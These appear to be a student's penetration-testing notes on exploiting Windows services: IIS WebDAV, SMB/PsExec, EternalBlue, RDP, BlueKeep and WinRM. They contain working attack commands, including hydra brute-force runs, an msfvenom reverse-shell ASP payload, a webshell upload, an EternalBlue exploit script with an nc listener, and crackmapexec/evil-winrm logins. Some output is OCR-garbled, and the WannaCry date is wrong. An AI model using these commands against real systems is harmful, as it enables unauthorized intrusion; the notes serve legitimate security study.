--- 
## A Brief History of Windows Vulnerabilities
- Microsoft Windows is the dominant operating system worldwide with a market
share >=70% as of 2021.

- The popularity and deployment of Windows by individuals and companies makes
it a prime target for attackers given the threat surface.

- Over the last 15 years, Windows has had its fair share of severe vulnerabilities,
ranging from MS08-067(Conflicker) to MS17-010 (EternalBlue).

- Given the popularity of Windows, most of these vulnerabilities have publicly
accessible exploit code making them relatively straightforward to exploit.

## Windows Vulnerabilities

- Microsoft **Windows has various OS versions and releases** which makes the threat surface fragmented in terms of vulnerabilities. For example, vulnerabilities that exist in Windows 7 are not present in Windows 10.

- Regardless of the various versions and releases, all Windows OS’s share a
likeness given the development model and philosophy:

- Windows OS’s have been d**eveloped in the C** programming language, making
them vulnerable to buffer overflows, arbitrary code execution etc.

- By default, **Windows is not configured to run securely** and require a proactive implementation of security practices in order to configure Windows to run securely.

- Newly discovered vulnerabilities are **not immediately patched** by Microsoft and
given the fragmented nature of Windows, many systems are left unpatched.

- The frequent releases of new versions of Windows is also a **contributing factor** to exploitation, as many companies take a substantial length of time to upgrade their systems to the latest version of Windows and opt to use older versions that may be affected by an increasing number of vulnerabilities.

- In addition to inherent vulnerabilities, Windows is also vulnerable to **cross-platform vulnerabilities**, for example SQL injection attacks.

- Systems/hosts running Windows are also **vulnerable to physical attacks** like;
theft, malicious peripheral devices etc.

## Types of Windows Vulnerabilities

- **Information disclosure** - Vulnerability that allows an attacker to access confidential data.

- **Buffer overflows** - Caused by a programming error, allows attackers to write data to a buffer and overrun the allocated buffer, consequently writing data to allocated memory addresses.

- **Remote code execution** - Vulnerability that allows an attacker to remotely execute code on the target system.

- **Privilege escalation** - Vulnerability that allows an attacker to elevate their privileges after initial compromise.

- **Denial of Service (DOS)** - Vulnerability that allows an attacker to consume a system/host’s resources (CPU, RAM, Network etc) consequently preventing the system from functioning normally.

## Frequently Exploited Windows Services

-  Microsoft Windows has various native services and protocols that can be
configured to run on a host.

-  These services provide an attacker with an access vector that they can utilize
to gain access to a target host.

-  Having a good understanding of what these services are, how they work and
their potential vulnerabilities is a vitally important skill to have as a
penetration tester.

![[Pasted image 20230409210221.png]]

## Exploiting Microsoft IIS WebDAV

### Microsoft IIS

- IIS (Internet Information Services) is a proprietary extensible web server software developed by Microsoft for use with the Windows NT family.
 - It can be used to host websites/web apps and provides administrators with a robust GUI for managing websites.
- IIS can be used to host both static and dynamic web pages developed in ASP.NET and PHP.
- Typically configured to run on ports 80/443.
- Supported executable file extensions:
	+ .asp
	+ .aspx
	+ .config
	+ .php


### WebDAV

- WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.

- WebDAV essentially enables a web server to **function as a file server** for
collaborative authoring.
- **WebDAV runs on top Microsoft IIS on ports** 80/443.

- In order to connect to a WebDAV server, you will need to **provide legitimate credentials.** This is because WebDAV implements authentication in the form of a username and password.
-
### Exploitation Process
- The first step of the exploitation process will **involve identifying whether WebDAV has been configured to run on the IIS web server**.

``` bash
nmap -sV -sC 10.18.22.5
nmap -sV -p 80 --script=http-enum 10.18.22.5
# Vulnerable output
# PORT STATE SERVICE VERSION 
#80/tcp open http Microsoft IIS httpd 10.0 
#| http-enum: (VAT LRl o tentially interesting folde[SEGSMIEMGITSELT)] 
#|_http-server-header: Microsoft-I115/10.0 Service Info: 0S: Windows; 
#CPE: cpe:/o:microsoft:windows
```

-  We can perform a **brute-force** attack on the WebDAV server in order to
**identify legitimate credentials** that we can use for authentication.

``` bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/m etasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
```

-  After obtaining legitimate credentials, we can **authenticate** with the WebDAV server and **upload a malicious .asp payload** that can be used to execute arbitrary commands or obtain a reverse shell on the target.

### Tools to Exploit

#### [davtest](https://github.com/cldrn/davtest) 

> Used to scan, authenticate and exploit a WebDAV server.

**This program attempts to exploit WebDAV enabled servers by:**

- attempting to create a new directory (MKCOL)
- attempting to put test files of various programming langauges (PUT)
- optionally attempt to put files with .txt extension, then move to executable (MOVE)
- optionally attempt to put files with .txt extension, then copy to executable (COPY)
- check if files executed or were uploaded properly
- optionally upload a backdoor/shell file for languages which execute

Additionally, this can be used to put an arbitrary file to remote systems.

``` bash
davtest -url http://localhost/davdir -auth user:pass
``` 

#### [cadaver](https://github.com/notroj/cadaver) 

cadaver supports file upload, download, on-screen display, in-
place editing, namespace operations (move/copy), collection creation and
deletion, property manipulation, and resource locking on WebDAV servers.

``` bash
cadaver http://10.2.17.124/webdav 
dav:/webdav/> Username: bob 
dav:/webdav/> Password: CEVEPL 
dav:/webdav/> put /usr/share/webshells/asp/webshell. asp 
```

### Using Metasploit

##### 1. Create the payload manually:

``` bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > shell.asp
# creation of the palyload 

service postgresql start & msfconsole 
# starting the database and msfconsole

msf6 > use multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
```

##### Use pre-defined module
``` bash
msf6 > use exploit/windows/iis/iis_webdav_upload_asp 
msf6 > set PATH /webdav/metasploit.asp 
```

## SMB Exploitation

SMB (Server Message Block) is a network file sharing protocol that is used to
facilitate the sharing of files and peripherals (printers and serial ports) between
computers on a local network (LAN).

- SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using
port 139.

- SAMBA is the open source Linux implementation of SMB, and allows Windows
systems to access Linux shares and devices.

**The SMB protocol utilizes two levels of authentication, namely:**

1. **User authentication** - Users must provide a username and password in order
to authenticate with the SMB server in order to access a share.

2.  **Share authentication** - Users must provide a password in order to access
restricted share.
![[Pasted image 20230410105226.png]]


### [[PsExec]]

-  PsExec is a lightweight t**elnet-replacement** developed by Microsoft that
allows you to execute processes on remote Windows systems using any user’s
credentials.

-  PsExec authentication is performed via SMB.

-  We can use the PsExec **utility to authenticate with the target system
legitimately and run arbitrary commands** or launch a remote command
prompt.

-  It is very similar to RDP, however, instead of controlling the remote system
via GUI, commands are sent via CMD.

**In order to utilize PsExec to gain access to a Windows target, we will need to identify
legitimate user accounts and their respective passwords or password hashes.**

- This can be done by leveraging various tools and techniques, however, the most
common technique will involve performing an SMB login brute-force attack.

- We can narrow down our brute-force attack to only include common Windows user
accounts like:
+ Administrator
- Gust
- After we have obtained a legitimate user account and password, we can use the
credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell.

```
msf5 > use auxilairy/scanner/smb/smb_login 
```

#### [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)

PSEXEC like functionality example using [RemComSvc](<(https://github.com/kavika13/RemCom)>)

```bash
psexec.py Administrator@10.2.24.221 cmd.exe
> Password: 
```

#### PsExec Exploit Using Metasploit
```bash
msf6 > use exploit/windows/psexec

# To be able to use `exploit/windows/smb/psexec`:
#1.  A valid username and password must be set.
#2.  The firewall must allow SMB traffic.
#3.  The remote Windows machine's network security policy must allow it. 
```

## MS17-010 EternalBlue Exploit

-  EternalBlue (MS17-010/CVE-2017-0144) is the name given to a collection of
Windows vulnerabilities and exploits that allow attackers to remotely execute
arbitrary code and gain access to a Windows system and consequently the
network that the target system is a part of.

-  The EternalBlue exploit was developed by the NSA (National Security Agency)
to take advantage of the MS17-010 vulnerability and was leaked to the public
by a hacker group called the Shadow Brokers in 2017.

-  The EternalBlue exploit takes advantage of a vulnerability in the Windows
SMBv1 protocol that allows attackers to send specially crafted packets that
consequently facilitate the execution of arbitrary commands.

- The EternalBlue exploit was used in the WannaCry ransomware attack on June 27, 2017 to exploit other Windows systems across networks with the objectiveof spreading the ransomware to as many systems as possible.
-  This vulnerability affects multiple versions of Windows:
	○ Windows Vista
	○ Windows 7
	○ Windows Server 2008
	○ Windows 8.1
	○ Windows Server 2012
	○ Windows 10
	○ Windows Server 2016

- Microsoft released a patch for the vulnerability in March, 2017, however, many
users and companies have still not yet patched their systems.

-  The EternalBlue exploit has a MSF auxiliary module that can be used to check if
a target system if vulnerable to the exploit and also has an exploit module that
can be used to exploit the vulnerability on unpatched systems.

- The EternalBlue exploit module can be used to exploit vulnerable Windows
systems and consequently provide us with a privileged meterpreter session on
the target system.

-  In addition to MSF modules, we can also manually exploit the vulnerability by
utilizing publicly available exploit code.

### [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
This is some no-bs public exploit code that generates valid shellcode for the eternal blue exploit and scripts out the event listener with the metasploit multi-handler.

```bash
pip install -r requirements.txt
chmod +x ./shell_prep.sh

./shell_prep.sh

listener_prep.sh
# or use nc
nc -nvlp 1234

python3 eternalblue-exploit7.py 10.10.10.12 shellcode/sc_x64.bin
```

#### EternalBlue Exploit Using Metasploit
```bash
msf6 > exploit/windows/smb/ms17_010_eternalblue
```

## Exploiting RDP

- The Remote Desktop Protocol (RDP) is a proprietary GUI remote access
protocol developed by Microsoft and is used to remotely connect and interact
with a Windows system.

-  RDP uses TCP port 3389 by default, and can also be configured to run on any
other TCP port.

-  RDP authentication requires a legitimate user account on the target system as
well as the user’s password in clear-text.

-  We can perform an RDP brute-force attack to identify legitimate user
credentials that we can use to gain remote access to the target system.

``` bash
msf5 > use auxiliary/scanner/rdp/rdp_scanner 
# check if the port is running RDP

hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-franework/data/w| ordlists/unix_passwords.txt rdp://10.2.24.86 -s 3333
# Start brute force a username and a password

xfreerdp /u:administrator /p:qwertyuiop /v:10.2.24.86:3333
# connect to the RDP using valid creds
```

## CVE-2019-0708 - BlueKeep

- BlueKeep (CVE-2019-0708) is the name given to an RDP vulnerability in Windows that could potentially allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.

-  The BlueKeep vulnerability was made public by Microsoft in May 2019.

 - The BlueKeep exploit takes advantage of a vulnerability in the Windows RDP protocol that allows attackers to gain access to a chunk of kernel memory consequently allowing them to remotely execute arbitrary code at the system level without authentication.

- Microsoft released a patch for this vulnerability on May 14th, 2019 and hasurged companies to patch this vulnerability as soon as possible.

 - At the time of discovery, about 1 million systems worldwide were found to be
vulnerable.

-  The BlueKeep vulnerability affects multiple versions of Windows:
	○ XP
	○ Vista
	○ Windows 7
	○ Windows Server 2008 & R2

- The BlueKeep vulnerability has various illegitimate PoC’s and exploit code that could be malicious in nature. It is therefore recommended to only utilize verified exploit code and modules for exploitation.

-  The BlueKeep exploit has an MSF auxiliary module that can be used to check if a
target system if vulnerable to the exploit and also has an exploit module that can be
used to exploit the vulnerability on unpatched systems.

-  The BlueKeep exploit module can be used to exploit vulnerable Windows systems
and consequently provide us with a privileged meterpreter session on the target
system.

**Note**: Targeting Kernel space memory and applications can cause system crashes.

``` bash
msf6> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep    
msf6> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```  

## Exploiting WinRM

- Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP(S).

- Microsoft implemented WinRM in to Windows in order to make life easier for
system administrators.
-  WinRM is typically used in the following ways:
	○ Remotely access and interact with Windows hosts on a local network.
	○ Remotely access and execute commands on Windows systems.
	○ Manage and configure Windows systems remotely.

- WinRM typically uses TCP port **5985** and **5986** (HTTPS).

-  WinRM implements access control and security for communication between systems through various forms of authentication.

-  We can utilize a utility called “**crackmapexec**” to perform a brute-force on WinRM in order to identify users and the passwords,rds as well as execute commands on the target system.

``` bash
crackmapexec winrm 10.2.18.45 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 


crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x “whoami*

```

 - We can also utilize a ruby script called “**evil-winrm”** to obtain a command shell
session on the target system.

``` bash
evil-winrm.rb -u administrator -p 'tinkerbell' -i 10,.2.18.45
``` 

``` bash
msf6 > exploit/windows/winrm/winrm_script_exec 
```

> Read More:
> 	[[04 - Windows Privilege Escalation]]
> 	[[03 - Windows File System Vulnerabilities]]
> 	[[05 - Windows Credential Dumping]]